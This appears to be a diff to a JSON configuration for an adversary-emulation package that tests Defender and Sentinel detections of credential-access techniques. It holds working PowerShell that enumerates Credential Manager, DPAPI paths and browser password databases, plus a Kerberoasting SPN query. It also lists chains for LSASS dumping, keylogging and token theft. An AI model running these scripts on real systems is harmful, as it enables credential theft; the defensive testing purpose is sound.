+      "description": "Enumerates Windows password storage mechanisms across three stores: (1) Windows Credential Manager via cmdkey /list (shows saved credentials without values); (2) DPAPI master key directories and credential blob paths (APPDATA\\Microsoft\\Credentials, LOCALAPPDATA\\Microsoft\\Credentials, APPDATA\\Microsoft\\Protect); (3) browser saved password database locations (Chrome and Edge Login Data SQLite files). Read-only enumeration - no credential decryption or content access. cmdkey and DPAPI path enumeration are monitored by MDE.",
+      "tactic": "Credential Access",
+      "tcode": "T1555",
+      "technique_name": "Credentials from Password Stores",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1555 - Credentials from Password Stores (Credential Manager + DPAPI + browser Login Data)'; Write-Host '[INFO] Step 1/3: Windows Credential Manager enumeration via cmdkey /list'; try { $cmdkeyOutput = & cmdkey.exe /list 2>&1; $lines = @($cmdkeyOutput) | Where-Object { $_ -match '\\S' }; Write-Host ('[INFO] cmdkey /list returned ' + $lines.Count + ' line(s)'); $credEntries = $lines | Where-Object { $_ -match 'Target:|Type:|User:' }; if ($credEntries) { $credEntries | ForEach-Object { Write-Host ('    ' + $_.ToString().Trim()) } } else { Write-Host '[INFO]   Credential Manager empty or no entries matched (check cmdkey /list manually)' } } catch { Write-Host ('[INFO]   cmdkey error: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/3: DPAPI credential blob and master key paths'; $dpApiPaths = @( [System.IO.Path]::Combine($env:APPDATA, 'Microsoft', 'Credentials'), [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'Credentials'), [System.IO.Path]::Combine($env:APPDATA, 'Microsoft', 'Protect') ); foreach ($dpPath in $dpApiPaths) { if (Test-Path $dpPath) { $items = @(Get-ChildItem -LiteralPath $dpPath -Force -ErrorAction SilentlyContinue); Write-Host ('[INFO]   DPAPI path: ' + $dpPath + ' | ' + $items.Count + ' item(s)') } else { Write-Host ('[INFO]   Not found: ' + $dpPath) } }; Write-Host '[INFO] Step 3/3: Browser saved password database paths (Chrome, Edge Login Data)'; $browserPassPaths = @( [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'), [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data') ); foreach ($bpPath in $browserPassPaths) { $item = Get-Item -LiteralPath $bpPath -ErrorAction SilentlyContinue; if ($item) { Write-Host ('[INFO]   Login Data found: ' + $item.FullName + ' | Size: ' + $item.Length + ' bytes') } else { Write-Host ('[INFO]   Not found: ' + $bpPath) } }; Write-Host '[SUCCESS] T1555 - Password store enumeration completed. Sentinel target: Access to Windows Credential Manager and DPAPI credential stores (MDE behavioral)'",
+      "cleanup_command": "Write-Host '[INFO] T1555 cleanup: no artefacts - read-only enumeration only'",
+      "detection_rule": "Access to Windows Credential Manager and DPAPI credential stores",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1558-Kerberoasting SPN Enumeration",
+      "name": "Excalibur - CredAccess-T1558-Kerberoasting SPN Enumeration",
+      "description": "Queries Active Directory for enabled user accounts with Service Principal Names (SPNs) using an LDAP [adsisearcher] query, simulating the reconnaissance phase of Kerberoasting. In a real attack, the adversary requests Kerberos TGS tickets for the SPN accounts and cracks them offline to obtain service account credentials. The LDAP query pattern for SPN-bearing user accounts is a well-known Kerberoasting pre-attack indicator monitored by MDE and Sentinel. Requires a domain-joined machine. On workgroup machines the query fails gracefully.",
+      "tactic": "Credential Access",
+      "tcode": "T1558",
+      "technique_name": "Steal or Forge Kerberos Tickets",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_cred_t1558_max_results"],
+      "command": "Write-Host '[START] T1558 - Kerberoasting SPN LDAP enumeration'; $maxResults = [int]'#{excalibur_cred_t1558_max_results}'; Write-Host ('[INFO] Domain: ' + $env:USERDNSDOMAIN + ' | Max SPN accounts to enumerate: ' + $maxResults); Write-Host '[INFO] LDAP filter: (&(servicePrincipalName=*)(objectCategory=user)(!userAccountControl:disabled))'; try { $searcher = [adsisearcher]'(&(servicePrincipalName=*)(objectCategory=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))'; $searcher.PageSize = $maxResults; $searcher.SizeLimit = $maxResults; $searcher.PropertiesToLoad.AddRange(@('samaccountname', 'serviceprincipalname', 'distinguishedname')) | Out-Null; $results = $searcher.FindAll(); Write-Host ('[INFO] LDAP query completed - SPN user accounts found: ' + $results.Count); $count = 0; foreach ($result in $results) { if ($count -ge $maxResults) { break }; $sam = $result.Properties['samaccountname'][0]; $spns = $result.Properties['serviceprincipalname'] -join ', '; Write-Host ('    ' + $sam + ' -> ' + $spns); $count++ }; $searcher.Dispose(); Write-Host '[SUCCESS] T1558 - Kerberoasting SPN enumeration completed. Sentinel target: LDAP query for user accounts with service principal names (Kerberoasting pre-attack recon - MDE LDAP telemetry)' } catch { if ($_.Exception.Message -imatch 'server|ldap|domain|contact|forest') { Write-Host '[WARN] LDAP query failed - machine is likely not domain-joined. T1558 SPN enumeration requires an Active Directory environment.' } else { Write-Host ('[ERROR] ' + $_.Exception.Message) }; Write-Host '[INFO] T1558 execution complete - LDAP query attempt was logged as telemetry even if the domain query failed' }",
+      "cleanup_command": "Write-Host '[INFO] T1558 cleanup: no artefacts - read-only LDAP query only'",
+      "detection_rule": "LDAP query for accounts with service principal names (Kerberoasting recon)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    }
+  ],
+  "chains": [
+    {
+      "name": "Excalibur - CredAccess-T1003-LSASS MiniDump",
+      "description": "Emulation chain for T1003: LSASS credential dump via rundll32 comsvcs.dll MiniDump. Validates MDE behavioral detection of the most widely used LOLBin credential dumping technique. Requires Administrator.",
+      "package": "excalibur",
+      "tcode": "T1003",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1003-LSASS MiniDump"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1040-Network Sniffing",
+      "description": "Emulation chain for T1040: network packet capture via netsh trace LOLBin. Validates MDE detection of built-in OS tool abuse for network credential sniffing. Requires Administrator.",
+      "package": "excalibur",
+      "tcode": "T1040",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1040-Network Sniffing"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1056-Input Capture",
+      "description": "Emulation chain for T1056: input capture via GetAsyncKeyState API polling. Validates MDE behavioral detection of keylogger API usage patterns.",
+      "package": "excalibur",
+      "tcode": "T1056",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1056-Input Capture"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1110-Brute Force",
+      "description": "Emulation chain for T1110: brute force simulation via LogonUser API failures. Validates Event ID 4625 threshold detection for brute force analytics rules.",
+      "package": "excalibur",
+      "tcode": "T1110",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1110-Brute Force"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1187-Forced Authentication",
+      "description": "Emulation chain for T1187: forced authentication via UNC .url lure file. Validates MDE detection of shortcut files with external UNC path references (NTLM relay lure pattern).",
+      "package": "excalibur",
+      "tcode": "T1187",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1187-Forced Authentication"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1528-Steal Application Access Token",
+      "description": "Emulation chain for T1528: OAuth token cache enumeration across Azure CLI, GitHub CLI, and browser web data. Validates MDE file access telemetry for application token theft recon.",
+      "package": "excalibur",
+      "tcode": "T1528",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1528-Steal Application Access Token"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1539-Steal Web Session Cookie",
+      "description": "Emulation chain for T1539: browser cookie store enumeration. Validates MDE file access detection for web session cookie theft recon (Chrome, Edge, Firefox).",
+      "package": "excalibur",
+      "tcode": "T1539",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1539-Steal Web Session Cookie"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1552-Unsecured Credentials",
+      "description": "Emulation chain for T1552: unsecured credential search across filesystem, environment variables, and registry credential stores. Validates MDE behavioral detection of credential hunting patterns.",
+      "package": "excalibur",
+      "tcode": "T1552",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1552-Unsecured Credentials"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1555-Password Stores",
+      "description": "Emulation chain for T1555: Windows Credential Manager, DPAPI, and browser Login Data enumeration. Validates MDE detection of password store access patterns.",
+      "package": "excalibur",
+      "tcode": "T1555",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1555-Password Stores"]
+    },
+    {
+      "name": "Excalibur - CredAccess-T1558-Kerberoasting SPN Enumeration",
+      "description": "Emulation chain for T1558: Kerberoasting SPN LDAP enumeration. Validates MDE LDAP telemetry detection for Kerberoasting pre-attack reconnaissance. Requires domain-joined machine.",
+      "package": "excalibur",
+      "tcode": "T1558",
+      "tactic": "Credential Access",
+      "script_refs": ["Excalibur - CredAccess-T1558-Kerberoasting SPN Enumeration"]
+    },
+    {
+      "name": "Excalibur - CredAccess Full Sweep",
+      "description": "Full sweep of all 10 Credential Access technique emulations. Runs sequentially on the Morgana Windows agent. IMPORTANT: T1003 and T1040 require Administrator or SYSTEM. T1558 requires a domain-joined machine. T1110 generates 5x Event ID 4625 entries in Security event logs. All other scripts are read-only with no network connections or file writes.",
+      "package": "excalibur",
+      "tcode": "TA0006",
+      "tactic": "Credential Access",
+      "script_refs": [
+        "Excalibur - CredAccess-T1003-LSASS MiniDump",
+        "Excalibur - CredAccess-T1040-Network Sniffing",
+        "Excalibur - CredAccess-T1056-Input Capture",
+        "Excalibur - CredAccess-T1110-Brute Force",
+        "Excalibur - CredAccess-T1187-Forced Authentication",
+        "Excalibur - CredAccess-T1528-Steal Application Access Token",
+        "Excalibur - CredAccess-T1539-Steal Web Session Cookie",
+        "Excalibur - CredAccess-T1552-Unsecured Credentials",
+        "Excalibur - CredAccess-T1555-Password Stores",
+        "Excalibur - CredAccess-T1558-Kerberoasting SPN Enumeration"
+      ]
+    }
+  ]
+}
